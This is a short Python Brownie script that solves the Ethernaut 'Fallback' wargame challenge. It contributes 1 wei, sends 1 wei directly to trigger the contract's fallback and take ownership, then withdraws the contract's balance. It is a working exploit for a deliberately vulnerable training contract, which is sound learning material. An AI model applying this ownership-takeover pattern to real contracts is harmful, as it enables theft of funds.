from brownie import Fallback
from scripts.challenge_utils import (
    connect_to_challenge, get_acc
)
from web3 import Web3

ETHERNAUT_INSTANCE = '0x5eE20D39d1527d325CC80e18fC04b4454C41160e'

def main():
    connect_to_challenge()
    contract = Fallback.at(ETHERNAUT_INSTANCE)
    acc = get_acc()
    print(f'using {acc}')

    contract.contribute({'from': acc, 'value': 1})
    acc.transfer(contract.address, 1)
    contract.withdraw({'from': acc})
     
